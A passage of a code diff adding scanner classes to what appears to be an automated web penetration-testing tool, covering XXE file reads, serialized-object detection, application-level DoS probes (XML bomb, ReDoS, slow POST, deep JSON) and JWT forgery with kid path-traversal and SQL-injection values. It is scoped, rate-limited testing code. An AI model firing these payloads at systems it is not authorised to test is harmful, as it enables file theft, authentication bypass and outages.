+            '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{uri}">]>'
+            '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
+            '<text x="0" y="20">&xxe;</text></svg>'
+        ),
+    }
+
+    _XML_CONTENT_TYPES = [
+        "application/xml", "text/xml", "application/soap+xml",
+    ]
+
+    _XML_PARSER_RE = re.compile(
+        r"xerces|expat|libxml|SAXParser|XMLReader|DOMParser|lxml|simplexml|xml\.etree",
+        re.IGNORECASE,
+    )
+
+    _BENIGN_XML = '<?xml version="1.0"?><root><data>test</data></root>'
+    _MAX_REQUESTS = 100
+    _MAX_ENDPOINTS = 20
+
+    def __init__(self, scope_guard: ActiveScopeGuard, timeout: int = 10,
+                 socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        proxy_kwargs: dict[str, Any] = {}
+        if socks_proxy:
+            proxy_kwargs["proxy"] = socks_proxy
+        self._client = httpx.AsyncClient(
+            timeout=timeout, verify=False, follow_redirects=False,
+            **proxy_kwargs,
+        )
+        self._requests_sent = 0
+
+    async def scan(
+        self,
+        base_url: str,
+        endpoints: dict[str, dict[str, Any]] | None = None,
+    ) -> dict[str, Any]:
+        start = time.monotonic()
+        findings: list[dict[str, Any]] = []
+        endpoints_tested = 0
+
+        # Collect candidate URLs
+        candidates: list[str] = []
+        if endpoints:
+            for url in endpoints:
+                if self._scope_guard.is_in_scope(url):
+                    candidates.append(url)
+        if not candidates:
+            candidates = [base_url]
+        candidates = candidates[: self._MAX_ENDPOINTS]
+
+        # Phase 1: Discover XML-accepting endpoints
+        xml_endpoints: list[str] = []
+        for url in candidates:
+            if self._requests_sent >= self._MAX_REQUESTS:
+                break
+            if await self._probe_xml_acceptance(url):
+                xml_endpoints.append(url)
+
+        # Phase 2: Test XXE on accepting endpoints
+        for url in xml_endpoints:
+            if self._requests_sent >= self._MAX_REQUESTS:
+                break
+            endpoints_tested += 1
+            ep_findings = await self._test_xxe(url)
+            findings.extend(ep_findings)
+
+        elapsed = round(time.monotonic() - start, 1)
+        logger.info("xxe_scan_complete", endpoints_tested=endpoints_tested,
+                     requests_sent=self._requests_sent, findings=len(findings),
+                     elapsed=elapsed)
+        return {
+            "findings": findings,
+            "endpoints_tested": endpoints_tested,
+            "requests_sent": self._requests_sent,
+            "elapsed_seconds": elapsed,
+        }
+
+    async def _probe_xml_acceptance(self, url: str) -> bool:
+        """Send benign XML to see if endpoint accepts it (not 415)."""
+        for ct in self._XML_CONTENT_TYPES:
+            if self._requests_sent >= self._MAX_REQUESTS:
+                return False
+            try:
+                self._requests_sent += 1
+                resp = await self._client.post(
+                    url, content=self._BENIGN_XML,
+                    headers={"Content-Type": ct},
+                )
+                if resp.status_code != 415:  # Not Unsupported Media Type
+                    return True
+            except Exception:
+                pass
+        return False
+
+    async def _test_xxe(self, url: str) -> list[dict[str, Any]]:
+        findings: list[dict[str, Any]] = []
+        for tmpl_name, tmpl in self._XXE_TEMPLATES.items():
+            for file_uri, detect_re in self._FILE_PAYLOADS:
+                if self._requests_sent >= self._MAX_REQUESTS:
+                    return findings
+                payload = tmpl.replace("{uri}", file_uri)
+                try:
+                    self._requests_sent += 1
+                    resp = await self._client.post(
+                        url, content=payload,
+                        headers={"Content-Type": "application/xml"},
+                    )
+                except Exception:
+                    continue
+
+                score = 0
+                detail_parts: list[str] = []
+                body = resp.text
+
+                # Check for file contents
+                if detect_re and re.search(detect_re, body):
+                    score = 5
+                    detail_parts.append(f"File contents ({file_uri}) found in response")
+                elif file_uri == "file:///FLAG" and len(body) > 10 and "error" not in body.lower():
+                    score = 5
+                    detail_parts.append("FLAG file content returned")
+                # Check parser name in error
+                elif self._XML_PARSER_RE.search(body):
+                    score = 3
+                    match = self._XML_PARSER_RE.search(body)
+                    detail_parts.append(f"XML parser name exposed: {match.group() if match else '?'}")
+
+                if score == 0:
+                    continue
+
+                req_dump = (
+                    f"POST {url}\nContent-Type: application/xml\n\n"
+                    f"{payload[:400]}"
+                )
+                headers = "\n".join(f"{k}: {v}" for k, v in list(resp.headers.items())[:10])
+                resp_dump = f"HTTP {resp.status_code}\n{headers}\n\n{body[:500]}"
+
+                findings.append({
+                    "endpoint": url,
+                    "xxe_type": tmpl_name,
+                    "file_target": file_uri,
+                    "detail": f"XXE ({tmpl_name}) reading {file_uri}: {'; '.join(detail_parts)}",
+                    "evidence_score": score,
+                    "status_code": resp.status_code,
+                    "request_dump": req_dump,
+                    "response_dump": resp_dump,
+                })
+
+                if score == 5:
+                    break  # Early exit on confirmed file read
+            # If we found a score-5 on this template, skip other templates for this EP
+            if findings and findings[-1]["evidence_score"] == 5 and findings[-1]["endpoint"] == url:
+                break
+
+        return findings
+
+    async def close(self):
+        await self._client.aclose()
+
+
+# ── Deserialization Scanner ──────────────────────────────────────────
+
+
+class DeserializationScanner:
+    """Detect insecure deserialization patterns — zero LLM cost, DETECTION ONLY.
+
+    Scans cookies, proxy traffic, and HTTP responses for serialized object
+    patterns (Java, PHP, .NET ViewState, Python pickle, Node, YAML).
+    Does NOT send exploitation payloads — only identifies surfaces.
+    """
+
+    _PATTERNS: list[tuple[str, str, re.Pattern]] = [
+        ("java_serialized", "Java serialized object",
+         re.compile(r"rO0AB[A-Za-z0-9+/=]{10,}|aced0005[0-9a-f]{10,}", re.IGNORECASE)),
+        ("php_serialized", "PHP serialized object",
+         re.compile(r'[OaCis]:\d+:', re.IGNORECASE)),
+        ("dotnet_viewstate", ".NET ViewState",
+         re.compile(r'/wEP[A-Za-z0-9+/=]{20,}')),
+        ("python_pickle", "Python pickle",
+         re.compile(r'gASV[A-Za-z0-9+/=]{10,}')),
+        ("node_serialize", "Node.js serialize",
+         re.compile(r'_\$\$ND_FUNC\$\$_')),
+        ("yaml_unsafe", "Unsafe YAML tag",
+         re.compile(r'!!python/|!!ruby/|!!java/')),
+        ("java_content_type", "Java serialization Content-Type",
+         re.compile(r'application/x-java-serialized-object', re.IGNORECASE)),
+    ]
+
+    _VIEWSTATE_UNPROTECTED_RE = re.compile(
+        r'__VIEWSTATE[^>]*value="([^"]{20,})"[^>]*(?!__VIEWSTATEGENERATOR)',
+        re.IGNORECASE,
+    )
+
+    _MAX_PAGES = 15
+
+    def __init__(self, scope_guard: ActiveScopeGuard, timeout: int = 10,
+                 socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        proxy_kwargs: dict[str, Any] = {}
+        if socks_proxy:
+            proxy_kwargs["proxy"] = socks_proxy
+        self._client = httpx.AsyncClient(
+            timeout=timeout, verify=False, follow_redirects=True,
+            **proxy_kwargs,
+        )
+
+    async def scan(
+        self,
+        base_url: str,
+        endpoints: dict[str, dict[str, Any]] | None = None,
+        proxy_traffic: list[dict[str, Any]] | None = None,
+        cookies: dict[str, str] | None = None,
+    ) -> dict[str, Any]:
+        start = time.monotonic()
+        findings: list[dict[str, Any]] = []
+        endpoints_tested = 0
+
+        # Phase 1: Check cookies
+        if cookies:
+            findings.extend(self._scan_cookies(cookies, base_url))
+
+        # Phase 2: Check proxy traffic
+        if proxy_traffic:
+            seen_urls: set[str] = set()
+            for entry in proxy_traffic[:200]:
+                url = entry.get("url", "")
+                if url in seen_urls:
+                    continue
+                seen_urls.add(url)
+                # Check request body
+                body = entry.get("request_body") or entry.get("body") or ""
+                if body:
+                    findings.extend(self._scan_text(body, f"request_body:{url}",
+                                                    controllable=True))
+                # Check response body
+                resp_body = entry.get("response_body") or ""
+                if resp_body:
+                    findings.extend(self._scan_text(resp_body, f"response:{url}",
+                                                    controllable=False))
+                # Check response headers for content-type
+                resp_headers = entry.get("response_headers") or {}
+                ct = resp_headers.get("content-type", "")
+                if "x-java-serialized" in ct.lower():
+                    findings.append({
+                        "endpoint": url,
+                        "format": "java_content_type",
+                        "location": "response_header",
+                        "detail": f"Java serialization Content-Type in response: {ct}",
+                        "evidence_score": 4,
+                        "matched_value": ct,
+                        "controllable": False,
+                    })
+
+        # Phase 3: Fetch pages and check responses + forms
+        candidates: list[str] = []
+        if endpoints:
+            for url in endpoints:
+                if self._scope_guard.is_in_scope(url):
+                    candidates.append(url)
+        if not candidates:
+            candidates = [base_url]
+        candidates = candidates[: self._MAX_PAGES]
+
+        for url in candidates:
+            endpoints_tested += 1
+            try:
+                resp = await self._client.get(url)
+                body = resp.text
+
+                # Check response body
+                findings.extend(self._scan_text(body, f"page:{url}", controllable=False))
+
+                # Check ViewState protection
+                vs_finding = self._check_viewstate_protection(body, url)
+                if vs_finding:
+                    findings.append(vs_finding)
+
+                # Check Set-Cookie headers
+                for cookie_val in resp.headers.get_list("set-cookie"):
+                    findings.extend(self._scan_text(
+                        cookie_val, f"set-cookie:{url}", controllable=True,
+                    ))
+            except Exception:
+                continue
+
+        elapsed = round(time.monotonic() - start, 1)
+        logger.info("deser_scan_complete", endpoints_tested=endpoints_tested,
+                     findings=len(findings), elapsed=elapsed)
+        return {
+            "findings": findings,
+            "endpoints_tested": endpoints_tested,
+            "requests_sent": endpoints_tested,
+            "elapsed_seconds": elapsed,
+        }
+
+    def _scan_text(
+        self, text: str, source_label: str, controllable: bool = False,
+    ) -> list[dict[str, Any]]:
+        results: list[dict[str, Any]] = []
+        for fmt_name, fmt_desc, pattern in self._PATTERNS:
+            match = pattern.search(text)
+            if match:
+                results.append({
+                    "endpoint": source_label,
+                    "format": fmt_name,
+                    "location": source_label.split(":")[0],
+                    "detail": f"{fmt_desc} detected in {source_label}",
+                    "evidence_score": 4 if controllable else 3,
+                    "matched_value": match.group()[:100],
+                    "controllable": controllable,
+                })
+        return results
+
+    def _scan_cookies(
+        self, cookies: dict[str, str], base_url: str,
+    ) -> list[dict[str, Any]]:
+        import base64
+        results: list[dict[str, Any]] = []
+        for name, value in cookies.items():
+            # Check raw value
+            for fmt_name, fmt_desc, pattern in self._PATTERNS:
+                if pattern.search(value):
+                    results.append({
+                        "endpoint": base_url,
+                        "format": fmt_name,
+                        "location": f"cookie:{name}",
+                        "detail": f"{fmt_desc} in cookie '{name}'",
+                        "evidence_score": 4,
+                        "matched_value": value[:100],
+                        "controllable": True,
+                    })
+            # Try base64 decode
+            try:
+                decoded = base64.b64decode(value + "==").decode("utf-8", errors="replace")
+                for fmt_name, fmt_desc, pattern in self._PATTERNS:
+                    if pattern.search(decoded):
+                        results.append({
+                            "endpoint": base_url,
+                            "format": fmt_name,
+                            "location": f"cookie_b64:{name}",
+                            "detail": f"{fmt_desc} in base64-decoded cookie '{name}'",
+                            "evidence_score": 4,
+                            "matched_value": decoded[:100],
+                            "controllable": True,
+                        })
+            except Exception:
+                pass
+        return results
+
+    def _check_viewstate_protection(
+        self, html: str, url: str,
+    ) -> dict[str, Any] | None:
+        match = self._VIEWSTATE_UNPROTECTED_RE.search(html)
+        if not match:
+            return None
+        # Check if __VIEWSTATEGENERATOR or __EVENTVALIDATION present (MAC protection)
+        if "__VIEWSTATEGENERATOR" in html or "__EVENTVALIDATION" in html:
+            return None
+        return {
+            "endpoint": url,
+            "format": "dotnet_viewstate_unprotected",
+            "location": "form_field",
+            "detail": f"Unprotected .NET ViewState (no MAC) on {url}",
+            "evidence_score": 4,
+            "matched_value": match.group(1)[:80],
+            "controllable": True,
+        }
+
+    async def close(self):
+        await self._client.aclose()
+
+
+# ── Application-Level DoS Scanner ────────────────────────────────────
+
+
+class AppLevelDoSScanner:
+    """Detect application-level Denial of Service vectors — zero LLM cost.
+
+    Tests: ReDoS payloads, XML bomb (safe 4-level), GraphQL depth query,
+    deeply nested JSON, slow POST.  Compares response times against
+    baseline to identify slowdowns.  Safety: 10s timeout per test, max 90
+    requests, 4-level XML bomb produces ~10K entities (safe).
+    """
+
+    _REDOS_PAYLOADS: list[tuple[str, str]] = [
+        ("email", "a" * 50 + "@" + "a" * 50 + ".com" + "!" * 10),
+        ("nested_quantifier", "a" * 30 + "!" * 10),
+        ("backtracking", "a" * 25 + "b"),
+        ("url", "http://" + "a" * 50 + "." * 20),
+    ]
+
+    _XML_BOMB = (
+        '<?xml version="1.0"?>'
+        '<!DOCTYPE lolz ['
+        '<!ENTITY lol "lol">'
+        '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
+        '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
+        '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">'
+        ']>'
+        '<root>&lol4;</root>'
+    )
+
+    _NESTED_JSON_DEPTH = 500
+    _SLOWDOWN_THRESHOLD = 5.0
+    _MODERATE_THRESHOLD = 3.0
+    _MAX_REQUESTS = 90
+
+    def __init__(self, scope_guard: ActiveScopeGuard, timeout: int = 10,
+                 socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        proxy_kwargs: dict[str, Any] = {}
+        if socks_proxy:
+            proxy_kwargs["proxy"] = socks_proxy
+        self._client = httpx.AsyncClient(
+            timeout=timeout, verify=False, follow_redirects=False,
+            **proxy_kwargs,
+        )
+        self._requests_sent = 0
+
+    async def scan(
+        self,
+        base_url: str,
+        endpoints: dict[str, dict[str, Any]] | None = None,
+        graphql_url: str | None = None,
+    ) -> dict[str, Any]:
+        start = time.monotonic()
+        findings: list[dict[str, Any]] = []
+        endpoints_tested = 0
+
+        # Get baseline timing
+        baseline_ms = await self._get_baseline(base_url)
+        if baseline_ms is None:
+            baseline_ms = 200.0  # Fallback
+
+        # Collect test targets
+        targets: list[str] = []
+        if endpoints:
+            for url in endpoints:
+                if self._scope_guard.is_in_scope(url):
+                    targets.append(url)
+        if not targets:
+            targets = [base_url]
+        targets = targets[:10]
+
+        # Test ReDoS on endpoints with parameters
+        for url in targets:
+            if self._requests_sent >= self._MAX_REQUESTS:
+                break
+            params = {}
+            if endpoints and url in endpoints:
+                params = endpoints[url].get("params") or {}
+            if params:
+                endpoints_tested += 1
+                f = await self._test_redos(url, params, baseline_ms)
+                findings.extend(f)
+
+        # Test XML bomb on first few endpoints
+        for url in targets[:3]:
+            if self._requests_sent >= self._MAX_REQUESTS:
+                break
+            endpoints_tested += 1
+            f = await self._test_xml_bomb(url, baseline_ms)
+            if f:
+                findings.append(f)
+
+        # Test GraphQL depth
+        if graphql_url and self._requests_sent < self._MAX_REQUESTS:
+            endpoints_tested += 1
+            f = await self._test_graphql_depth(graphql_url, baseline_ms)
+            if f:
+                findings.append(f)
+
+        # Test nested JSON
+        for url in targets[:3]:
+            if self._requests_sent >= self._MAX_REQUESTS:
+                break
+            endpoints_tested += 1
+            f = await self._test_json_nesting(url, baseline_ms)
+            if f:
+                findings.append(f)
+
+        # Test slow POST (connection hold)
+        for url in targets[:2]:
+            if self._requests_sent >= self._MAX_REQUESTS:
+                break
+            endpoints_tested += 1
+            f = await self._test_slow_post(url)
+            if f:
+                findings.append(f)
+
+        elapsed = round(time.monotonic() - start, 1)
+        logger.info("dos_scan_complete", endpoints_tested=endpoints_tested,
+                     requests_sent=self._requests_sent, findings=len(findings),
+                     elapsed=elapsed)
+        return {
+            "findings": findings,
+            "endpoints_tested": endpoints_tested,
+            "requests_sent": self._requests_sent,
+            "elapsed_seconds": elapsed,
+        }
+
+    async def _get_baseline(self, url: str) -> float | None:
+        """Average response time over 3 requests (ms)."""
+        times: list[float] = []
+        for _ in range(3):
+            if self._requests_sent >= self._MAX_REQUESTS:
+                break
+            try:
+                self._requests_sent += 1
+                t0 = time.monotonic()
+                await self._client.get(url)
+                times.append((time.monotonic() - t0) * 1000)
+            except Exception:
+                pass
+        return sum(times) / len(times) if times else None
+
+    async def _test_redos(
+        self, url: str, params: dict, baseline_ms: float,
+    ) -> list[dict[str, Any]]:
+        findings: list[dict[str, Any]] = []
+        text_params = [p for p in params if isinstance(params.get(p), str) or params.get(p) is None]
+        if not text_params:
+            text_params = list(params.keys())[:2]
+
+        for param in text_params[:2]:
+            for dos_name, payload in self._REDOS_PAYLOADS:
+                if self._requests_sent >= self._MAX_REQUESTS:
+                    return findings
+                injected = dict(params)
+                injected[param] = payload
+                try:
+                    self._requests_sent += 1
+                    t0 = time.monotonic()
+                    resp = await self._client.get(url, params=injected)
+                    test_ms = (time.monotonic() - t0) * 1000
+                except httpx.TimeoutException:
+                    test_ms = 10000.0
+                    resp = None
+                except Exception:
+                    continue
+
+                ratio = test_ms / max(baseline_ms, 1)
+                if ratio >= self._MODERATE_THRESHOLD:
+                    score = 4 if ratio >= self._SLOWDOWN_THRESHOLD else 3
+                    req_dump = f"GET {url}?{param}={payload[:80]}"
+                    resp_dump = ""
+                    if resp:
+                        resp_dump = f"HTTP {resp.status_code} ({test_ms:.0f}ms vs {baseline_ms:.0f}ms baseline)"
+                    else:
+                        resp_dump = f"TIMEOUT ({test_ms:.0f}ms vs {baseline_ms:.0f}ms baseline)"
+                    findings.append({
+                        "endpoint": url,
+                        "dos_type": f"redos_{dos_name}",
+                        "detail": f"ReDoS ({dos_name}) on param '{param}': {ratio:.1f}x slowdown",
+                        "evidence_score": score,
+                        "status_code": resp.status_code if resp else 0,
+                        "baseline_time_ms": round(baseline_ms, 1),
+                        "test_time_ms": round(test_ms, 1),
+                        "slowdown_ratio": round(ratio, 1),
+                        "request_dump": req_dump,
+                        "response_dump": resp_dump,
+                    })
+        return findings
+
+    async def _test_xml_bomb(
+        self, url: str, baseline_ms: float,
+    ) -> dict[str, Any] | None:
+        try:
+            self._requests_sent += 1
+            t0 = time.monotonic()
+            resp = await self._client.post(
+                url, content=self._XML_BOMB,
+                headers={"Content-Type": "application/xml"},
+            )
+            test_ms = (time.monotonic() - t0) * 1000
+        except httpx.TimeoutException:
+            test_ms = 10000.0
+            resp = None
+        except Exception:
+            return None
+
+        ratio = test_ms / max(baseline_ms, 1)
+        if ratio < self._MODERATE_THRESHOLD:
+            return None
+
+        score = 4 if ratio >= self._SLOWDOWN_THRESHOLD else 3
+        return {
+            "endpoint": url,
+            "dos_type": "xml_bomb",
+            "detail": f"XML bomb (billion laughs level 4): {ratio:.1f}x slowdown",
+            "evidence_score": score,
+            "status_code": resp.status_code if resp else 0,
+            "baseline_time_ms": round(baseline_ms, 1),
+            "test_time_ms": round(test_ms, 1),
+            "slowdown_ratio": round(ratio, 1),
+            "request_dump": f"POST {url}\nContent-Type: application/xml\n\n{self._XML_BOMB[:200]}",
+            "response_dump": f"{'HTTP ' + str(resp.status_code) if resp else 'TIMEOUT'} ({test_ms:.0f}ms)",
+        }
+
+    async def _test_graphql_depth(
+        self, graphql_url: str, baseline_ms: float,
+    ) -> dict[str, Any] | None:
+        # Build 50-deep nested __typename query
+        query = "{ __typename " + "{ __typename " * 49 + "}" * 49 + "}"
+        try:
+            self._requests_sent += 1
+            t0 = time.monotonic()
+            resp = await self._client.post(
+                graphql_url,
+                json={"query": query},
+                headers={"Content-Type": "application/json"},
+            )
+            test_ms = (time.monotonic() - t0) * 1000
+        except httpx.TimeoutException:
+            test_ms = 10000.0
+            resp = None
+        except Exception:
+            return None
+
+        ratio = test_ms / max(baseline_ms, 1)
+        if ratio < self._MODERATE_THRESHOLD:
+            return None
+
+        score = 4 if ratio >= self._SLOWDOWN_THRESHOLD else 3
+        return {
+            "endpoint": graphql_url,
+            "dos_type": "graphql_depth",
+            "detail": f"GraphQL depth query (50 levels): {ratio:.1f}x slowdown",
+            "evidence_score": score,
+            "status_code": resp.status_code if resp else 0,
+            "baseline_time_ms": round(baseline_ms, 1),
+            "test_time_ms": round(test_ms, 1),
+            "slowdown_ratio": round(ratio, 1),
+            "request_dump": f"POST {graphql_url}\n\n{{query: depth=50}}",
+            "response_dump": f"{'HTTP ' + str(resp.status_code) if resp else 'TIMEOUT'} ({test_ms:.0f}ms)",
+        }
+
+    async def _test_slow_post(
+        self, url: str,
+    ) -> dict[str, Any] | None:
+        """Send body 1 byte per 2 seconds, check if server holds connection."""
+        import socket
+        from urllib.parse import urlparse
+
+        parsed = urlparse(url)
+        host = parsed.hostname or ""
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        path = parsed.path or "/"
+
+        try:
+            self._requests_sent += 1
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            sock.connect((host, port))
+
+            # Send partial HTTP POST headers with large Content-Length
+            header = (
+                f"POST {path} HTTP/1.1\r\n"
+                f"Host: {host}\r\n"
+                f"Content-Type: application/x-www-form-urlencoded\r\n"
+                f"Content-Length: 100000\r\n"
+                f"\r\n"
+            )
+            if parsed.scheme == "https":
+                import ssl
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                sock = ctx.wrap_socket(sock, server_hostname=host)
+
+            sock.sendall(header.encode())
+
+            # Send 1 byte every 2s, check if connection stays open
+            t0 = time.monotonic()
+            bytes_sent = 0
+            held_seconds = 0.0
+            for _ in range(5):  # 10 seconds max
+                await asyncio.sleep(2)
+                try:
+                    sock.sendall(b"A")
+                    bytes_sent += 1
+                except (BrokenPipeError, ConnectionResetError, OSError):
+                    break
+            held_seconds = time.monotonic() - t0
+            sock.close()
+
+            if held_seconds >= 8.0:
+                return {
+                    "endpoint": url,
+                    "dos_type": "slow_post",
+                    "detail": f"Server held connection for {held_seconds:.1f}s with slow POST (1 byte/2s)",
+                    "evidence_score": 4 if held_seconds >= 10.0 else 3,
+                    "status_code": 0,
+                    "baseline_time_ms": 0,
+                    "test_time_ms": round(held_seconds * 1000, 1),
+                    "slowdown_ratio": 0,
+                    "request_dump": f"POST {path} (slow body: {bytes_sent} bytes in {held_seconds:.1f}s)",
+                    "response_dump": f"Connection held {held_seconds:.1f}s",
+                }
+            return None
+        except Exception:
+            return None
+
+    async def _test_json_nesting(
+        self, url: str, baseline_ms: float,
+    ) -> dict[str, Any] | None:
+        nested = "x"
+        for _ in range(self._NESTED_JSON_DEPTH):
+            nested = {"a": nested}
+        try:
+            self._requests_sent += 1
+            t0 = time.monotonic()
+            resp = await self._client.post(
+                url, json=nested,
+                headers={"Content-Type": "application/json"},
+            )
+            test_ms = (time.monotonic() - t0) * 1000
+        except httpx.TimeoutException:
+            test_ms = 10000.0
+            resp = None
+        except Exception:
+            return None
+
+        ratio = test_ms / max(baseline_ms, 1)
+        if ratio < self._MODERATE_THRESHOLD:
+            return None
+
+        score = 4 if ratio >= self._SLOWDOWN_THRESHOLD else 3
+        return {
+            "endpoint": url,
+            "dos_type": "json_nesting",
+            "detail": f"Nested JSON ({self._NESTED_JSON_DEPTH} levels): {ratio:.1f}x slowdown",
+            "evidence_score": score,
+            "status_code": resp.status_code if resp else 0,
+            "baseline_time_ms": round(baseline_ms, 1),
+            "test_time_ms": round(test_ms, 1),
+            "slowdown_ratio": round(ratio, 1),
+            "request_dump": f"POST {url}\nContent-Type: application/json\n\n{{depth: {self._NESTED_JSON_DEPTH}}}",
+            "response_dump": f"{'HTTP ' + str(resp.status_code) if resp else 'TIMEOUT'} ({test_ms:.0f}ms)",
+        }
+
+    async def close(self):
+        await self._client.aclose()
+
+
+# ── JWT Deep Analyzer ────────────────────────────────────────────────
+
+
+class JWTDeepAnalyzer:
+    """Deep JWT security analysis — zero LLM cost (offline tests), minimal
+    network for active tests.
+
+    Tests: none algorithm, alg confusion (RS256→HS256), weak secret
+    brute-force (20 common secrets, offline), expired token acceptance,
+    kid header injection (path traversal + SQLi).
+    """
+
+    _WEAK_SECRETS: list[str] = [
+        "secret", "password", "123456", "admin", "key", "jwt_secret",
+        "changeme", "test", "default", "pass", "letmein", "qwerty",
+        "abc123", "password1", "iloveyou", "welcome", "monkey",
+        "master", "dragon", "login",
+    ]
+
+    _KID_INJECTIONS: list[tuple[str, str]] = [
+        ("null_file", "/dev/null"),
+        ("passwd_traversal", "../../../../../../etc/passwd"),
+        ("environ_traversal", "../../../../../../proc/self/environ"),
+        ("sqli", "' UNION SELECT 'secret' -- "),
+    ]
+
+    def __init__(self, scope_guard: ActiveScopeGuard | None = None,
+                 timeout: int = 10, socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        proxy_kwargs: dict[str, Any] = {}
+        if socks_proxy:
+            proxy_kwargs["proxy"] = socks_proxy
+        self._client = httpx.AsyncClient(
+            timeout=timeout, verify=False, follow_redirects=False,
+            **proxy_kwargs,
+        )
+
+    async def analyze(
+        self,
+        token: str,
+        target_url: str | None = None,
+        cookies: dict[str, str] | None = None,
+    ) -> dict[str, Any]:
+        start = time.monotonic()
+        findings: list[dict[str, Any]] = []
+
+        # Decode JWT
+        parts = token.split(".")
+        if len(parts) < 2:
+            return {"findings": [], "error": "Invalid JWT format",
+                    "elapsed_seconds": round(time.monotonic() - start, 1)}
+
+        header = self._decode_part(parts[0])
+        payload = self._decode_part(parts[1])
+        if header is None or payload is None:
+            return {"findings": [], "error": "Failed to decode JWT",
+                    "elapsed_seconds": round(time.monotonic() - start, 1)}
+
+        original_alg = header.get("alg", "unknown")
+
+        # Test 1: none algorithm (needs network)
+        if target_url:
+            f = await self._test_none_algorithm(header, payload, target_url, cookies)
+            if f:
+                findings.append(f)
+
+        # Test 2: alg confusion RS256 → HS256 (needs network)
+        if target_url and original_alg.startswith("RS"):
+            f = await self._test_alg_confusion(header, payload, target_url, cookies)
+            if f:
+                findings.append(f)
+
+        # Test 3: weak secrets (OFFLINE — no network)
+        f = self._test_weak_secrets(token, header, payload, original_alg)
+        if f:
+            findings.append(f)
+
+        # Test 4: expired token (needs network)
+        if target_url:
+            f = await self._test_expired_token(header, payload, target_url, cookies)
+            if f:
+                findings.append(f)
+
+        # Test 5: kid injection (needs network)
+        if target_url and "kid" in header:
+            kid_findings = await self._test_kid_injection(
+                header, payload, target_url, cookies, original_alg,
+            )
+            findings.extend(kid_findings)
+
+        elapsed = round(time.monotonic() - start, 1)
+        logger.info("jwt_deep_complete", findings=len(findings),
+                     original_alg=original_alg, elapsed=elapsed)
+        return {
+            "findings": findings,
+            "original_algorithm": original_alg,
+            "header": header,
+            "payload": payload,
+            "elapsed_seconds": elapsed,
+        }
+
+    def _decode_part(self, part: str) -> dict[str, Any] | None:
+        import base64
+        try:
+            padded = part + "=" * (4 - len(part) % 4)
+            decoded = base64.urlsafe_b64decode(padded)
+            return json.loads(decoded)
+        except Exception:
+            return None
+
+    def _build_jwt(
+        self, header: dict, payload: dict, secret: str, algorithm: str = "HS256",
+    ) -> str:
+        import base64
+        import hashlib
+        import hmac
+
+        def b64url(data: bytes) -> str:
+            return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+        h = b64url(json.dumps(header, separators=(",", ":")).encode())
+        p = b64url(json.dumps(payload, separators=(",", ":")).encode())
+        signing_input = f"{h}.{p}"
+
+        if algorithm == "none":
+            return f"{signing_input}."
+
+        if algorithm in ("HS256", "HS384", "HS512"):
+            hash_func = {
+                "HS256": hashlib.sha256,
+                "HS384": hashlib.sha384,
+                "HS512": hashlib.sha512,
+            }[algorithm]
+            sig = hmac.new(
+                secret.encode(), signing_input.encode(), hash_func,
+            ).digest()
+            return f"{signing_input}.{b64url(sig)}"
+
+        return f"{signing_input}."
+
+    async def _send_jwt(
+        self, token: str, target_url: str, cookies: dict[str, str] | None,
+    ) -> httpx.Response | None:
+        """Send JWT via Authorization header, then try common cookie names."""
+        # Try Bearer header first
+        try:
+            resp = await self._client.get(
+                target_url,
+                headers={"Authorization": f"Bearer {token}"},
+                cookies=cookies,
+            )
+            if resp.status_code not in (401, 403):
+                return resp
+        except Exception:
+            pass
+
+        # Try common JWT cookie names
+        for cookie_name in ("token", "jwt", "session", "access_token", "auth"):
+            try:
+                jar = dict(cookies or {})
+                jar[cookie_name] = token
+                resp = await self._client.get(target_url, cookies=jar)
+                if resp.status_code not in (401, 403):
+                    return resp
+            except Exception:
+                pass
+
+        return None
+
+    async def _test_none_algorithm(
+        self, header: dict, payload: dict, target_url: str,
+        cookies: dict[str, str] | None,
+    ) -> dict[str, Any] | None:
+        forged_header = dict(header)
+        forged_header["alg"] = "none"
+        token = self._build_jwt(forged_header, payload, "", "none")
+        resp = await self._send_jwt(token, target_url, cookies)
+        if resp and resp.status_code == 200:
+            req_dump = f"GET {target_url}\nAuthorization: Bearer {token[:80]}..."
+            headers = "\n".join(f"{k}: {v}" for k, v in list(resp.headers.items())[:10])
+            return {
+                "endpoint": target_url,
+                "jwt_attack": "none_algorithm",
+                "detail": "JWT with alg=none accepted — authentication bypass",
+                "evidence_score": 5,
+                "cracked_secret": "",
+                "original_algorithm": header.get("alg", "?"),
+                "request_dump": req_dump,
+                "response_dump": f"HTTP {resp.status_code}\n{headers}\n\n{resp.text[:300]}",
+            }
+        return None
+
+    async def _test_alg_confusion(
+        self, header: dict, payload: dict, target_url: str,
+        cookies: dict[str, str] | None,
+    ) -> dict[str, Any] | None:
+        forged_header = dict(header)
+        forged_header["alg"] = "HS256"
+        # Sign with empty secret (mimics using public key as HMAC secret)
+        token = self._build_jwt(forged_header, payload, "", "HS256")
+        resp = await self._send_jwt(token, target_url, cookies)
+        if resp and resp.status_code == 200:
+            return {
+                "endpoint": target_url,
+                "jwt_attack": "alg_confusion",
+                "detail": f"RS→HS256 algorithm confusion: forged token accepted",
+                "evidence_score": 5,
+                "cracked_secret": "",
+                "original_algorithm": header.get("alg", "?"),
+                "request_dump": f"GET {target_url}\nAuthorization: Bearer {token[:80]}...",
+                "response_dump": f"HTTP {resp.status_code}\n{resp.text[:300]}",
+            }
+        return None
+
+    def _test_weak_secrets(
+        self, original_token: str, header: dict, payload: dict,
+        original_alg: str,
+    ) -> dict[str, Any] | None:
+        """Offline brute-force: try 20 common secrets, compare signatures."""
+        import base64
+        import hashlib
+        import hmac
+
+        if not original_alg.startswith("HS"):
+            return None
+
+        parts = original_token.split(".")
+        if len(parts) < 3:
+            return None
+
